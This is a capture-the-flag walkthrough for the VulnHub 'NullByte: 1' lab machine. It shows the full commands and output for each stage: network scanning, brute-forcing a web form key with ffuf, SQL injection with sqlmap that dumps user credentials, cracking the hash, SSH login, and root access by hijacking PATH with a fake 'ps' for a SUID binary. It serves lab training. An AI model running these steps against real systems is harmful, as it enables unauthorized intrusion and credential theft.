# NULLBYTE: 1

## 1.Get VM IP

```text
root@kali: arp-scan -I eth1 -l

Interface: eth1, type: EN10MB, MAC: 00:0c:29:3a:bc:b3, IPv4: 192.168.127.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.127.1   00:50:56:c0:00:01       VMware, Inc.
192.168.127.232 00:0c:29:5a:43:e9       VMware, Inc.
192.168.127.254 00:50:56:fd:64:8a       VMware, Inc.
```

The IP address is `192.168.127.232`, let's enumerate the machine.

## 2.Enumeration

```text
root@kali: nmap -sV -sC -p- -v -oN fullscan 192.168.127.232

Nmap scan report for 192.168.127.232
Host is up (0.0022s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Null Byte 00 - level 1
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          38099/tcp6  status
|   100024  1          49056/udp   status
|   100024  1          49267/tcp   status
|_  100024  1          53634/udp6  status
777/tcp   open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey:
|   1024 16:30:13:d9:d5:55:36:e8:1b:b7:d9:ba:55:2f:d7:44 (DSA)
|   2048 29:aa:7d:2e:60:8b:a6:a1:c2:bd:7c:c8:bd:3c:f4:f2 (RSA)
|   256 60:06:e3:64:8f:8a:6f:a7:74:5a:8b:3f:e1:24:93:96 (ECDSA)
|_  256 bc:f7:44:8d:79:6a:19:48:76:a3:e2:44:92:dc:13:a2 (ED25519)
49267/tcp open  status  1 (RPC #100024)
MAC Address: 00:0C:29:5A:43:E9 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

On port 80, we see a web page like this :

![mainPage](https://github.com/Git-K3rnel/VulnHub/assets/127470407/c2abb771-965c-4fbf-a5db-1906e0d2dc71)

fuzzing the website leads to finding a `phpmyadmin` path and nothing else, because there is no clue here, i thought that there might be something in the image itself

so i downloaded the image (which is a gif file) and inspected it with `exiftool` :

```text
root@kali: exiftool main.gif

ExifTool Version Number         : 12.65
File Name                       : main.gif
Directory                       : .
File Size                       : 17 kB
File Modification Date/Time     : 2015:08:01 12:39:30-04:00
File Access Date/Time           : 2023:09:23 07:03:57-04:00
File Inode Change Date/Time     : 2023:09:23 06:52:11-04:00
File Permissions                : -rw-r--r--
File Type                       : GIF
File Type Extension             : gif
MIME Type                       : image/gif
GIF Version                     : 89a
Image Width                     : 235
Image Height                    : 302
Has Color Map                   : No
Color Resolution Depth          : 8
Bits Per Pixel                  : 1
Background Color                : 0
Comment                         : P-): kzMb5nVYJw
Image Size                      : 235x302
Megapixels                      : 0.071
```

as it is shown in `Comment` section we see a string, `kzMb5nVYJw`, which is more likely to be the path.

by adding this string to the path in the website, the page below is shown :

![keypage](https://github.com/Git-K3rnel/VulnHub/assets/127470407/1c4156b7-7c45-4c95-bbb5-c9cb7be3d9ac)

and the page source has a comment :

```text
<!-- this form isn't connected to mysql, password ain't that complex --!>
```

so we can somehow brute force the password here, i used `ffuf` for doing this, but you can also use a custome python script or some other tools :

```text
root@kali: ffuf -w /usr/share/wordlists/rockyou.txt  -H "Content-Type: application/x-www-form-urlencoded" -X POST -d "key=FUZZ" -u http://192.168.127.232/kzMb5nVYJw/index.php -fw 19

[Status: 200, Size: 145, Words: 9, Lines: 7, Duration: 6ms]
    * FUZZ: elite
```

just provide the `elite` in the key input box and you will see the below page :

![index](https://github.com/Git-K3rnel/VulnHub/assets/127470407/80cac999-57d2-4378-862a-a7cbfa7c47f7)

i entered a double qoute ( `"` ) in the search box and an error is shown :

![sqlerror](https://github.com/Git-K3rnel/VulnHub/assets/127470407/c5ddd4c3-339f-4476-b736-8fa4df16fc40)

simply use `sqlmap` to dump the database :

```text
root@kali: sqlmap -u "http://192.168.127.232/kzMb5nVYJw/420search.php?usrtosearch=t" --batch --dbs

available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] seth
```

we are interested in `seth` databse so let's see the tables :

```text
root@kali: sqlmap -u "http://192.168.127.232/kzMb5nVYJw/420search.php?usrtosearch=t" --batch -D seth --tables

[1 table]
+-------+
| users |
+-------+
```

and finally dump `users` table :

```text
root@kali: sqlmap -u "http://192.168.127.232/kzMb5nVYJw/420search.php?usrtosearch=t" --batch -T users --dump

[2 entries]
+----+---------------------------------------------+--------+------------+
| id | pass                                        | user   | position   |
+----+---------------------------------------------+--------+------------+
| 1  | YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE | ramses | <blank>    |
| 2  | --not allowed--                             | isis   | employee   |
+----+---------------------------------------------+--------+------------+
```

## 3.Gaining Shell

Yes, we have `ramses` hashed password here, to find the actual password, first base64 decode the string (add a trailing `=` at the end) :

```text
root@kali: echo 'YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE' | base64 -d

c6d6bd7ebf806f43c76acc3681703b81
```

and use hashcat or john or crackstation to find the password, i used crackstation and it was `omega`

now we can simply SSH to the machine with `ramses:omega`

```text
root@kali: ssh ramses@192.168.127.232 -p 777
ramses@192.168.127.232's password:

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Sep 23 23:15:00 2023 from 192.168.127.128

ramses@NullByte:~$ id
uid=1002(ramses) gid=1002(ramses) groups=1002(ramses)
```

## 4.Privilege Escalation

Search for the file which have SUID bit set on them :

```text
ramses@NullByte:~$ find / -user root -perm /4000 2>/dev/null

/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/pt_chown
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/procmail
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/sudo
/usr/sbin/exim4
/var/www/backup/procwatch
/bin/su
/bin/mount
/bin/umount
/sbin/mount.nfs
```

the binary `procwatch` is interesting, let's check it :

```text
ramses@NullByte:~$ cd /var/www/backup/
ramses@NullByte:/var/www/backup$ ./procwatch
  PID TTY          TIME CMD
 1496 pts/0    00:00:00 procwatch
 1497 pts/0    00:00:00 sh
 1498 pts/0    00:00:00 ps
```

it's output is very similar to `ps` output, maybe we can exploit this by manuplating a custome ps binary and PATH variable :

```text
ramses@NullByte:/var/www/backup$ echo '/bin/sh' > ps

ramses@NullByte:/var/www/backup$ cat ps
/bin/sh

ramses@NullByte:/var/www/backup$ chmod +x ps

ramses@NullByte:/var/www/backup$ export PATH=$PWD:$PATH

ramses@NullByte:/var/www/backup$ ./procwatch
# id
uid=1002(ramses) gid=1002(ramses) euid=0(root) groups=1002(ramses)
```

yes, we are root now let's check `/root` directory :

```text
# cd /root

# ls
proof.txt

# cat proof.txt
adf11c7a9e6523e630aaf3b9b7acb51d

It seems that you have pwned the box, congrats.
Now you done that I wanna talk with you. Write a walk & mail at
xly0n@sigaint.org attach the walk and proof.txt
If sigaint.org is down you may mail at nbsly0n@gmail.com


USE THIS PGP PUBLIC KEY

-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: BCPG C# v1.6.1.0

mQENBFW9BX8BCACVNFJtV4KeFa/TgJZgNefJQ+fD1+LNEGnv5rw3uSV+jWigpxrJ
Q3tO375S1KRrYxhHjEh0HKwTBCIopIcRFFRy1Qg9uW7cxYnTlDTp9QERuQ7hQOFT
e4QU3gZPd/VibPhzbJC/pdbDpuxqU8iKxqQr0VmTX6wIGwN8GlrnKr1/xhSRTprq
Cu7OyNC8+HKu/NpJ7j8mxDTLrvoD+hD21usssThXgZJ5a31iMWj4i0WUEKFN22KK
+z9pmlOJ5Xfhc2xx+WHtST53Ewk8D+Hjn+mh4s9/pjppdpMFUhr1poXPsI2HTWNe
YcvzcQHwzXj6hvtcXlJj+yzM2iEuRdIJ1r41ABEBAAG0EW5ic2x5MG5AZ21haWwu
Y29tiQEcBBABAgAGBQJVvQV/AAoJENDZ4VE7RHERJVkH/RUeh6qn116Lf5mAScNS
HhWTUulxIllPmnOPxB9/yk0j6fvWE9dDtcS9eFgKCthUQts7OFPhc3ilbYA2Fz7q
m7iAe97aW8pz3AeD6f6MX53Un70B3Z8yJFQbdusbQa1+MI2CCJL44Q/J5654vIGn
XQk6Oc7xWEgxLH+IjNQgh6V+MTce8fOp2SEVPcMZZuz2+XI9nrCV1dfAcwJJyF58
kjxYRRryD57olIyb9GsQgZkvPjHCg5JMdzQqOBoJZFPw/nNCEwQexWrgW7bqL/N8
TM2C0X57+ok7eqj8gUEuX/6FxBtYPpqUIaRT9kdeJPYHsiLJlZcXM0HZrPVvt1HU
Gms=
=PiAQ
-----END PGP PUBLIC KEY BLOCK-----
```

This is how you can finish thix box :)



